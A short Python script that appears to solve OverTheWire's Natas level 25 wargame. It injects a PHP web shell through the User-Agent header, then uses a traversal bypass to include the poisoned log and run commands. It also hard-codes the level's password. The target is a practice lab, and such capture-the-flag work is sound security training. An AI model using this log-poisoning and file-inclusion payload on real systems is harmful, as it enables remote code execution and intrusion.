import requests
import readline

URL = "http://natas25.natas.labs.overthewire.org/"
AUTH = ("natas25", "GHF6X7YwACaYYssHVY05cFq83hRktl4c")

malcious = '<?php system($_GET["cmd"]) ?>'
r = requests.get(url=URL+"?lang=../../../en", auth=AUTH,
                 headers={"User-Agent": malcious})

PHPSESSID, SESSION = r.headers["Set-Cookie"].replace(
    "; path=/; HttpOnly", "").split("=")

new_url = f"http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_{SESSION}.log&cmd=whoami"
print(new_url)